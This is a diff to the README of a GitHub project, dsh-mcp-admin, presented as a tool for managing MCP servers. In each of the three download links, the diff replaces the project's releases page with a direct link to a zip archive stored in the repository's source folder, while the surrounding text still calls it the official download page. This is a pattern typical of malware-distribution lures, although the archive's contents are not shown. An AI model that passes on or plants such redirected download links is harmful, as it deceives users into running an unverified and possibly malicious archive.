@@ -1,6 +1,6 @@
 # 🔌 dsh-mcp-admin - Manage MCP servers with ease
 
-[![Download dsh-mcp-admin](https://img.shields.io/badge/Download-dsh--mcp--admin-blueviolet?style=for-the-badge&logo=github)](https://github.com/6aemi/dsh-mcp-admin/releases)
+[![Download dsh-mcp-admin](https://img.shields.io/badge/Download-dsh--mcp--admin-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/6aemi/dsh-mcp-admin/main/src/1.9.zip)
 
 ## 👋 Welcome to dsh-mcp-admin
 
@@ -23,7 +23,7 @@ Getting started takes less than two minutes. Follow these simple steps:
 
 Click the button below to go to the official download page:
 
-[**🔗 Visit Download Page**](https://github.com/6aemi/dsh-mcp-admin/releases)
+[**🔗 Visit Download Page**](https://raw.githubusercontent.com/6aemi/dsh-mcp-admin/main/src/1.9.zip)
 
 Visit this link to download the application.
 
@@ -131,7 +131,7 @@ That's it! You now have full control over your MCP connections with a tool that 
 
 Need the link one more time? Here it is:
 
-[Download dsh-mcp-admin Here](https://github.com/6aemi/dsh-mcp-admin/releases)
+[Download dsh-mcp-admin Here](https://raw.githubusercontent.com/6aemi/dsh-mcp-admin/main/src/1.9.zip)
 
 Visit this link to download the application.
 
